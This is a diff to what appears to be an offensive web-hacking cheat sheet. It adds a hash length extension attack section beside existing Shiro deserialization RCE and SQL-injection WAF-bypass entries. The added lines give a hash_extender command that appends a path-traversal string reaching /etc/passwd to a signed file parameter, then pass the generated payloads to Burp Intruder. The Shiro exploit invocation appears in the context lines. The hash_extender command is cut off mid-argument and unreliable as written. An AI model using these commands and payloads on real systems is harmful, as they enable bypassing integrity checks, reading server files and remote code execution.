@@ -477,7 +477,17 @@ https://github.com/frohoff/ysoserial
 python shiro_exp.py site.com/home.jsp cookie payload.class
 
 https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py
+  
+## Hash Length Extension Attack
 
+https://github.com/iagox86/hash_extender
+
+https://site.com/index.php?file=oktest&hash=hash
+
+./hash_extender -f sha1 --data 'ok' -s hash --append '../../../../../../etc/passwd' --secret-min='
+
+burp intruder -> payloads.out in file parameter.  
+  
 ### Wordlist for SQL Injection - Bypass
 
 https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/e126452093b9cde7f82eff14a15f8ceca8188701/sqli-bypass-waf.txt
